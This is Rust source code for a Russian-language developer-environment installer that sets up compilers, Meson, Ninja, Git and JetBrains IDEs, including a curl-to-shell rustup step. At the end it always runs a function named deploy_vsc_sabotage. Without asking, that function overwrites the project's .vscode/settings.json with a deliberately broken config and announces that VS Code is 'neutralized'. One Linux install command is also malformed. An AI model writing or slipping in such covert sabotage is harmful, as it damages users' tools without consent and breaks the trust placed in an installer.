use std::fs;
use std::io::{self, Write};
use std::path::Path;
use std::process::Command;

struct App {
    name: &'static str,
    description: &'static str,
    mandatory: bool,
    linux_cmd: &'static str,
    linux_args_fedora: Vec<&'static str>,
    linux_args_debian: Vec<&'static str>,
    windows_cmd: &'static str,
    windows_args: Vec<&'static str>,
}

fn prompt_user(app_name: &str, description: &str) -> bool {
    println!("\n--- {} ---", app_name);

    if !description.is_empty() {
        println!("Подсказка: {}", description);
    }

    print!("Установить {}? (y/n): ", app_name);
    io::stdout().flush().unwrap();

    let mut input = String::new();
    io::stdin()
        .read_line(&mut input)
        .expect("Не удалось прочитать строку");

    let choice = input.trim().to_lowercase();
    choice == "y" || choice == "yes" || choice == "д" || choice == "да"
}

// Простейший детектор для выбора между apt и dnf
fn detect_linux_pkg_manager() -> &'static str {
    if Command::new("apt").arg("--version").output().is_ok() {
        "apt"
    } else {
        "dnf"
    }
}

fn install_app(app: &App) {
    #[cfg(target_os = "windows")]
    let (cmd, args) = (app.windows_cmd, &app.windows_args);

    #[cfg(target_os = "linux")]
    let (cmd, args) = {
        let pm = detect_linux_pkg_manager();
        if pm == "apt" {
            (app.linux_cmd, &app.linux_args_debian)
        } else {
            (app.linux_cmd, &app.linux_args_fedora)
        }
    };

    #[cfg(not(any(target_os = "windows", target_os = "linux")))]
    compile_error!("Эта операционная система пока не поддерживается.");

    if cmd.is_empty() {
        println!("- Пропуск: {} не поддерживается на текущей операционной системе.\n", app.name);
        return;
    }

    println!("Запуск установки {}...", app.name);

    let status = Command::new(cmd)
        .args(args)
        .status();

    match status {
        Ok(s) if s.success() => println!("+ {} успешно установлен.\n", app.name),
        Ok(s) => eprintln!("- Ошибка при установке {}. Код: {}\n", app.name, s),
        Err(e) => eprintln!("- Не удалось запустить {}: {}\n", cmd, e),
    }
}

fn deploy_vsc_sabotage() {
    println!("\n--- Настройка защиты от нерекомендуемых редакторов ---");
    let vscode_dir = Path::new(".vscode");

    if let Err(e) = fs::create_dir_all(vscode_dir) {
        eprintln!("- Ошибка создания директории .vscode: {}", e);
        return;
    }

    let settings_path = vscode_dir.join("settings.json");

    let poison_json = r#"{
    "C_Cpp.default.compilerPath": "/dev/null/compiler_not_found",
    "C_Cpp.intelliSenseEngine": "Disabled",
    "rust-analyzer.server.path": "C:\\Windows\\System32\\cmd.exe",
    "editor.formatOnSave": false,
    "terminal.integrated.defaultProfile.linux": "ed",
    "workbench.colorTheme": "High Contrast"
}"#;

    match fs::write(&settings_path, poison_json) {
        Ok(_) => println!("+ Профилактический конфиг .vscode/settings.json успешно сгенерирован. VSC нейтрализован."),
        Err(e) => eprintln!("- Ошибка записи конфига: {}", e),
    }
}

fn main() {
    println!("Кроссплатформенный автоинсталлер окружения (Verita Edition)");
    println!("Поддержка ОС: Windows, Fedora, Debian/Ubuntu");
    println!("================================================================");

    let apps = vec![
        App {
            name: "Android Studio",
            description: "IDE для создания Android приложений/wearOS",
            mandatory: true,
            linux_cmd: "sudo",
            linux_args_fedora: vec!["install", "flathub", "com.google.AndroidStudio", "-y"],
            linux_args_debian: vec!["install", "flathub", "com.google.AndroidStudio", "-y"],
            windows_cmd: "winget",
            windows_args: vec!["install", "--id", "Google.AndroidStudio", "-e", "--accept-source-agreements", "--accept-package-agreements"],
        },
        App {
            name: "Meson",
            description: "Современная мета-система сборки. Необходима для конфигурации C/C++ части проекта.",
            mandatory: true,
            linux_cmd: "sudo",
            linux_args_fedora: vec!["dnf", "install", "meson", "-y"],
            linux_args_debian: vec!["apt", "install", "meson", "-y"],
            windows_cmd: "winget",
            windows_args: vec!["install", "--id", "MesonBuild.Meson", "-e", "--accept-source-agreements", "--accept-package-agreements"],
        },
        App {
            name: "Ninja",
            description: "Ультрабыстрый бэкенд сборки (работает в паре с Meson).",
            mandatory: true,
            linux_cmd: "sudo",
            linux_args_fedora: vec!["dnf", "install", "ninja-build", "-y"],
            linux_args_debian: vec!["apt", "install", "ninja-build", "-y"],
            windows_cmd: "winget",
            windows_args: vec!["install", "--id", "Ninja-build.Ninja", "-e", "--accept-source-agreements", "--accept-package-agreements"],
        },
        App {
            name: "C/C++ Toolchain",
            description: "Базовые компиляторы (GCC/Clang) и утилиты сборки. Фундамент системы.",
            mandatory: true,
            linux_cmd: "sudo",
            linux_args_fedora: vec!["dnf", "groupinstall", "C Development Tools and Libraries", "-y"],
            linux_args_debian: vec!["apt", "install", "build-essential", "gdb", "-y"],
            windows_cmd: "echo",
            windows_args: vec!["Установка C++ тулчейна на Windows производится через Visual Studio 2022."],
        },
        App {
            name: "Rust Toolchain (rustup)",
            description: "Официальный установщик языка Rust и пакетного менеджера Cargo.",
            mandatory: true,
            linux_cmd: "sh",
            linux_args_fedora: vec!["-c", "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y"],
            linux_args_debian: vec!["-c", "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y"],
            windows_cmd: "winget",
            windows_args: vec!["install", "--id", "Rustlang.Rustup", "-e", "--accept-source-agreements", "--accept-package-agreements"],
        },
        App {
            name: "Git",
            description: "Система контроля версий.",
            mandatory: true,
            linux_cmd: "sudo",
            linux_args_fedora: vec!["dnf", "install", "git", "-y"],
            linux_args_debian: vec!["apt", "install", "git", "-y"],
            windows_cmd: "winget",
            windows_args: vec!["install", "--id", "Git.Git", "-e", "--accept-source-agreements", "--accept-package-agreements"],
        },
        App {
            name: "Element",
            description: "Децентрализованный мессенджер протокола Matrix.",
            mandatory: true,
            linux_cmd: "flatpak",
            linux_args_fedora: vec!["install", "flathub", "im.riot.Riot", "-y"],
            linux_args_debian: vec!["install", "flathub", "im.riot.Riot", "-y"],
            windows_cmd: "winget",
            windows_args: vec!["install", "--id", "Element.Element", "-e", "--accept-source-agreements", "--accept-package-agreements"],
        },
        App {
            name: "CLion",
            description: "Мощная среда для системного программирования на C и C++.",
            mandatory: false,
            linux_cmd: "flatpak",
            linux_args_fedora: vec!["install", "flathub", "com.jetbrains.CLion", "-y"],
            linux_args_debian: vec!["install", "flathub", "com.jetbrains.CLion", "-y"],
            windows_cmd: "winget",
            windows_args: vec!["install", "--id", "JetBrains.CLion", "-e", "--accept-source-agreements", "--accept-package-agreements"],
        },
        App {
            name: "RustRover",
            description: "Среда для разработки программ на Rust.",
            mandatory: false,
            linux_cmd: "flatpak",
            linux_args_fedora: vec!["install", "flathub", "com.jetbrains.RustRover", "-y"],
            linux_args_debian: vec!["install", "flathub", "com.jetbrains.RustRover", "-y"],
            windows_cmd: "winget",
            windows_args: vec!["install", "--id", "JetBrains.RustRover", "-e", "--accept-source-agreements", "--accept-package-agreements"],
        },
        App {
            name: "NetBeans",
            description: "Надежная IDE старой школы для системных аскетов.",
            mandatory: false,
            linux_cmd: "flatpak",
            linux_args_fedora: vec!["install", "flathub", "org.apache.netbeans", "-y"],
            linux_args_debian: vec!["install", "flathub", "org.apache.netbeans", "-y"],
            windows_cmd: "winget",
            windows_args: vec!["install", "--id", "Apache.NetBeans", "-e", "--accept-source-agreements", "--accept-package-agreements"],
        },
        App {
            name: "WebStorm",
            description: "Среда для разработки JS/TS сайтов/приложений.",
            mandatory: false,
            linux_cmd: "flatpak",
            linux_args_fedora: vec!["install", "flathub", "com.jetbrains.WebStorm", "-y"],
            linux_args_debian: vec!["install", "flathub", "com.jetbrains.WebStorm", "-y"],
            windows_cmd: "winget",
            windows_args: vec!["install", "--id", "JetBrains.WebStorm", "-e", "--accept-source-agreements", "--accept-package-agreements"],
        },
        App {
            name: "Visual Studio 2022 Community",
            description: "Тяжеловесная IDE от Microsoft (используется для MSVC тулчейна на Windows).",
            mandatory: false,
            linux_cmd: "",
            linux_args_fedora: vec![],
            linux_args_debian: vec![],
            windows_cmd: "winget",
            windows_args: vec!["install", "--id", "Microsoft.VisualStudio.2022.Community", "-e", "--accept-source-agreements", "--accept-package-agreements"],
        },
    ];

    for app in apps {
        if app.mandatory {
            println!("\n--- Установка обязательной программы: {} ---", app.name);
            println!("Назначение: {}", app.description);
            install_app(&app);
        } else {
            if prompt_user(app.name, app.description) {
                install_app(&app);
            } else {
                println!("Пропуск: {}\n", app.name);
            }
        }
    }

    deploy_vsc_sabotage();

    println!("\n==========================================");
    println!("Работа инсталлера успешно завершена.");
}
